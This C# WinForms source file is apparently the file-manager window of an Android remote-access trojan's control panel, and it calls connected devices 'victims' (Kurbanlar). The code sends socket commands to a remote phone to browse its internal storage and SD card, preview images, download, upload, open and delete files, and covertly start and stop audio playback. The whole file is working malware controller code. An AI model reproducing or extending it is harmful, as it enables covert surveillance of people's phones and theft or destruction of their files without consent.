using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
namespace SV
{
    public partial class FİleManager : MetroFramework.Forms.MetroForm
    {
        Socket soketimiz;
        public string ID = "";
        ListViewItem dizin_yukari = new ListViewItem("...");
        ListViewItem dizin_yukari_ = new ListViewItem("...");
        List<ListViewItem> lArray = new List<ListViewItem>();
        List<ListViewItem> lArray_ = new List<ListViewItem>();
        public FİleManager(Socket s, string aydi)
        {
            InitializeComponent();
            metroTabControl1.SelectedIndex = 0;
            soketimiz = s;
            ID = aydi;
            dizin_yukari.ImageIndex = 13;
            dizin_yukari_.ImageIndex = 13;
            listView1.MouseClick += listView1_MouseClick;
            listView1.MouseDoubleClick += listView1_MouseDoubleClick;
            listView2.MouseClick += listView2_MouseClick;
            listView2.MouseDoubleClick += listView2_MouseDoubleClick;
        }
        private void indirToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }
        public void bilgileriIsle(string s1, string s2)
        {
            try
            {
                switch (s1)
                {
                    case "IKISIDE":
                        lArray.Clear(); lArray_.Clear();
                        listView1.Items.Clear();
                        listView2.Items.Clear();
                        break;
                    case "CIHAZ":
                        listView1.Items.Clear(); lArray.Clear();
                        break;
                    case "SDCARD":
                        listView2.Items.Clear(); lArray_.Clear();
                        break;
                }

                try { listView1.Items.Add(dizin_yukari); } catch (Exception) { }
                try { listView2.Items.Add(dizin_yukari_); } catch (Exception) { }

                if (s2 == "BOS")
                {
                    switch (s1)
                    {
                        case "IKISIDE":
                            listView1.BackgroundImageLayout = ImageLayout.Zoom;
                            listView1.BackgroundImage =
                            Properties.Resources.nothing;
                            listView2.BackgroundImageLayout = ImageLayout.Zoom;
                            listView2.BackgroundImage =
                            Properties.Resources.nothing;
                            break;
                        case "CIHAZ":
                            listView1.BackgroundImageLayout = ImageLayout.Zoom;
                            listView1.BackgroundImage =
                            Properties.Resources.nothing;
                            break;
                        case "SDCARD":
                            listView2.BackgroundImageLayout = ImageLayout.Zoom;
                            listView2.BackgroundImage =
                            Properties.Resources.nothing;
                            break;

                    }
                }
                else
                {
                    string[] lines = s2.Split('<');
                    foreach (string line in lines)
                    {
                        string[] parse = line.Split('=');
                        try
                        {
                            ListViewItem lv = new ListViewItem(parse[0]);
                            lv.SubItems.Add(parse[1]);
                            lv.SubItems.Add(parse[2]);
                            lv.SubItems.Add(parse[3]);
                            lv.SubItems.Add(parse[4]);
                            if (parse[2] == "")
                            {
                                lv.ImageIndex = 0;
                            }
                            else
                            {
                                switch (parse[2].ToLower())
                                {
                                    case ".txt":
                                        lv.ImageIndex = 11;
                                        break;
                                    case ".apk":
                                        lv.ImageIndex = 1;
                                        break;
                                    case ".jpeg":
                                    case ".jpg":
                                    case ".png":
                                    case ".gif":
                                        lv.ImageIndex = 4;
                                        break;
                                    case ".avi":
                                    case ".mp4":
                                    case ".flv":
                                    case ".mkv":
                                    case ".wmv":
                                    case ".mpg":
                                    case ".mpeg":
                                        lv.ImageIndex = 7;
                                        break;
                                    case ".mp3":
                                    case ".wav":
                                    case ".ogg":
                                        lv.ImageIndex = 6;
                                        break;
                                    case ".rar":
                                    case ".zip":
                                        lv.ImageIndex = 8;
                                        break;
                                    case ".pdf":
                                        lv.ImageIndex = 10;
                                        break;
                                    case ".html":
                                    case ".htm":
                                        lv.ImageIndex = 9;
                                        break;
                                    case ".doc":
                                    case ".docx":
                                        lv.ImageIndex = 2;
                                        break;
                                    case ".xlsx":
                                        lv.ImageIndex = 3;
                                        break;
                                    case ".pptx":
                                        lv.ImageIndex = 5;
                                        break;
                                    default:
                                        lv.ImageIndex = 12;
                                        break;
                                }
                            }

                            if (parse[4] == "CİHAZ")
                            {
                                //listView1.Items.Add(lv);
                                lArray.Add(lv);
                                textBox1.Text = parse[5];

                            }
                            else
                            {
                                if (parse[4] == "SDCARD")
                                {
                                    //listView2.Items.Add(lv);
                                    lArray_.Add(lv);
                                    textBox2.Text = parse[5];
                                }
                            }

                        }
                        catch (Exception)
                        {
                        }
                    }
                    listView2.Items.AddRange(lArray_.ToArray());
                }
            }
            catch (Exception)
            {
            }
            listView1.Items.AddRange(lArray.ToArray());
        }
        public void karsiyaYukle(TextBox textBox)
        {
            if (string.IsNullOrEmpty(textBox.Text) == false)
            {
                using (OpenFileDialog op = new OpenFileDialog()
                {
                    Multiselect = false,
                    Filter = "All files|*.*",
                    Title = "Select a file to upload.."
                })
                {
                    if (op.ShowDialog() == DialogResult.OK)
                    {
                        try
                        {
                            if (File.Exists(op.FileName))
                            {
                                Kurbanlar krbn = ((Form1)Application.OpenForms["Form1"]).kurban_listesi.Where(x => x.id == soketimiz.Handle.ToString()).FirstOrDefault();
                                if (krbn != null)
                                {
                                    string check = textBox1.Text + op.FileName.Substring(op.FileName.LastIndexOf(@"\") + 1) + "[ID]" + krbn.identify;
                                    if (((Form1)Application.OpenForms["Form1"]).FindUploadProgressById(check) == null)
                                    {
                                        FileInfo fi = new FileInfo(op.FileName);
                                        byte[] icerik = Encoding.UTF8.GetBytes(textBox.Text + "[VERI]" + op.FileName.Substring(op.FileName.LastIndexOf(@"\") + 1) + "[VERI]" + fi.Length.ToString() + "[VERI]" + op.FileName);
                                        byte[] dataToSend = Form1.MyDataPacker("DOSYABYTE", icerik);
                                        soketimiz.BeginSend(dataToSend, 0, dataToSend.Length, SocketFlags.None, null, null);
                                    }
                                    else
                                    {
                                        MessageBox.Show("You are already uploading same file to same directory!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                        ((Form1)Application.OpenForms["Form1"]).FindUploadProgressById(check).TopMost = true;
                                        ((Form1)Application.OpenForms["Form1"]).FindUploadProgressById(check).TopMost = false;
                                    }
                                }
                            }
                        }
                        catch (Exception) { }
                    }
                }
            }
        }      
        public void yenile()
        {
            if (textBox1.Text != "")
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("FOLDERFILE", Encoding.UTF8.GetBytes(textBox1.Text));
                    soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }
        public void yenileSD()
        {
            if (textBox2.Text != "")
            {
                listView2.BackgroundImage = null;
                try
                {
                    byte[] senddata = Form1.MyDataPacker("FILESDCARD", Encoding.UTF8.GetBytes(textBox2.Text));
                    soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }
        private void yenileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.BackgroundImage = null;
            yenile();
        }
        private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                Text = Text = "File Manager - " + ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(soketimiz.Handle.ToString());
                if (listView1.SelectedItems[0].ImageIndex == 13)
                {
                    if (textBox1.Text != "/storage/emulated/0")
                    {
                        pictureBox1.Visible = false;
                        listView1.BackgroundImage = null;
                        textBox1.Text = textBox1.Text.Replace(textBox1.Text.Substring(textBox1.Text.LastIndexOf("/")),
                            "");
                        yenile();
                    }
                }
                else
                {
                    if (listView1.SelectedItems[0].ImageIndex == 0)
                    {
                        listView1.BackgroundImage = null;
                        textBox1.Text = listView1.SelectedItems[0].SubItems[1].Text;
                        try
                        {
                            byte[] senddata = Form1.MyDataPacker("FOLDERFILE", Encoding.UTF8.GetBytes(listView1.SelectedItems[0].SubItems[1].Text));
                            soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }
        private void listView2_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (listView2.SelectedItems.Count == 1)
            {
                Text = "File Manager - " + ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(soketimiz.Handle.ToString());
                if (listView2.SelectedItems[0].ImageIndex == 13)
                {
                    if (textBox2.Text.Count(slash => slash == '/') > 2)
                    {
                        listView2.BackgroundImage = null;
                        textBox2.Text = textBox2.Text.Replace(textBox2.Text.Substring(textBox2.Text.LastIndexOf("/")),
                            "");
                        yenileSD();
                    }
                }
                else
                {
                    if (listView2.SelectedItems[0].ImageIndex == 0)
                    {
                        listView2.BackgroundImage = null;
                        textBox2.Text = listView2.SelectedItems[0].SubItems[1].Text;
                        try
                        {
                            byte[] senddata = Form1.MyDataPacker("FILESDCARD", Encoding.UTF8.GetBytes(listView2.SelectedItems[0].SubItems[1].Text));
                            soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }
                    }
                }
            }
        }
        private void yükleToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            karsiyaYukle(textBox2);
        }      
        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                if (listView1.SelectedItems[0].ImageIndex == 4)
                {
                    try
                    {
                        byte[] senddata = Form1.MyDataPacker("PRE", Encoding.UTF8.GetBytes(listView1.SelectedItems[0].SubItems[1].Text + "/" + listView1.SelectedItems[0].Text));
                        soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                    }
                    catch (Exception) { }
                }
                else { pictureBox1.Visible = false; }

                if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 13)
                {
                    label1.Text = "Name: " + listView1.SelectedItems[0].Text;
                    label2.Text = "Path: " + listView1.SelectedItems[0].SubItems[1].Text;
                    label3.Text = "Size: " + listView1.SelectedItems[0].SubItems[3].Text;
                    label4.Text = "Extension: " + listView1.SelectedItems[0].SubItems[2].Text;
                    label5.Text = "Location: " + listView1.SelectedItems[0].SubItems[4].Text.Replace("CİHAZ", "Device");
                }
            }
        }

        private void listView2_MouseClick(object sender, MouseEventArgs e)
        {
            if (listView2.SelectedItems.Count == 1)
            {
                if (listView2.SelectedItems[0].ImageIndex == 4)
                {
                    try
                    {
                        byte[] senddata = Form1.MyDataPacker("PRE", Encoding.UTF8.GetBytes(listView2.SelectedItems[0].SubItems[1].Text));
                        soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                    }
                    catch (Exception) { }
                }
                else { pictureBox1.Visible = false; }
                if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
                {
                    label1.Text = "Name: " + listView2.SelectedItems[0].Text;
                    label2.Text = "Path: " + listView2.SelectedItems[0].SubItems[1].Text;
                    label3.Text = "Size: " + listView2.SelectedItems[0].SubItems[3].Text;
                    label4.Text = "Extension: " + listView2.SelectedItems[0].SubItems[2].Text;
                    label5.Text = "Location: " + listView2.SelectedItems[0].SubItems[4].Text;
                }
            }
        }      
        private void FİleManager_Load(object sender, EventArgs e)
        {
            Refresh();
        }

        private void denemeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    Kurbanlar ident = ((Form1)Application.OpenForms["Form1"]).kurban_listesi.Where(x => x.id == soketimiz.Handle.ToString()).FirstOrDefault();
                    if (ident != null)
                    {
                        string id = listView1.SelectedItems[0].Text + "|" + Environment.CurrentDirectory + "\\Store\\Downloads\\" + ident.identify;
                        if (((Form1)Application.OpenForms["Form1"]).FindYuzdeById(id) == null)
                        {
                            byte[] senddata = Form1.MyDataPacker("INDIR", Encoding.UTF8.GetBytes(listView1.SelectedItems[0].SubItems[1].Text + "/" + listView1.SelectedItems[0].Text));
                            soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                        }
                        else
                        {
                            MessageBox.Show("You are already downloading same file in same directory!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                            ((Form1)Application.OpenForms["Form1"]).FindYuzdeById(id).TopMost = true;
                            ((Form1)Application.OpenForms["Form1"]).FindYuzdeById(id).TopMost = false;
                        }
                    }
                }
                catch (Exception) { }

            }
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            karsiyaYukle(textBox1);
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("DOSYAAC", Encoding.UTF8.GetBytes(listView1.SelectedItems[0].SubItems[1].Text + "/" +
                     listView1.SelectedItems[0].Text));
                    soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.BackgroundImage = null;
            yenile();
        }

        private void startToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 13)
            {

                if (listView1.SelectedItems[0].ImageIndex == 6)
                {
                    try
                    {
                        byte[] senddata = Form1.MyDataPacker("GIZLI", Encoding.UTF8.GetBytes(listView1.SelectedItems[0].SubItems[1].Text + "/" + listView1.SelectedItems[0].Text));
                        soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                    }
                    catch (Exception) { }

                }

            }
        }

        private void stopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("GIZKAPA", Encoding.UTF8.GetBytes("ECHO"));
                soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    Kurbanlar ident = ((Form1)Application.OpenForms["Form1"]).kurban_listesi.Where(x => x.id == soketimiz.Handle.ToString()).FirstOrDefault();
                    if (ident != null)
                    {
                        string id = listView2.SelectedItems[0].Text + "|" + Environment.CurrentDirectory + "\\Store\\Downloads\\" + ident.identify;
                        if (((Form1)Application.OpenForms["Form1"]).FindYuzdeById(id) == null)
                        {
                            byte[] senddata = Form1.MyDataPacker("INDIR", Encoding.UTF8.GetBytes(listView2.SelectedItems[0].SubItems[1].Text));
                            soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                        }
                        else
                        {
                            MessageBox.Show("You are already downloading same file in same directory!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                            ((Form1)Application.OpenForms["Form1"]).FindYuzdeById(id).TopMost = true;
                            ((Form1)Application.OpenForms["Form1"]).FindYuzdeById(id).TopMost = false;
                        }
                    }
                }
                catch (Exception) { }
            }
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("DOSYAAC", Encoding.UTF8.GetBytes(listView2.SelectedItems[0].SubItems[1].Text));
                    soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            yenileSD();
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("DELETE", Encoding.UTF8.GetBytes(listView2.SelectedItems[0].SubItems[1].Text));
                    soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }

        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems[0].ImageIndex != 0 && listView2.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    if (listView2.SelectedItems[0].ImageIndex == 6)
                    {
                        byte[] senddata = Form1.MyDataPacker("GIZLI", Encoding.UTF8.GetBytes(listView2.SelectedItems[0].SubItems[1].Text));
                        soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                    }
                }
                catch (Exception) { }
            }
        }

        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("GIZKAPA", Encoding.UTF8.GetBytes("ECHO"));
                soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems[0].ImageIndex != 0 && listView1.SelectedItems[0].ImageIndex != 13)
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("DELETE", Encoding.UTF8.GetBytes(listView1.SelectedItems[0].SubItems[1].Text + "/" + listView1.SelectedItems[0].Text));
                    soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                    listView1.SelectedItems[0].Remove();
                }
                catch (Exception) { }
            }
        }
    }
}
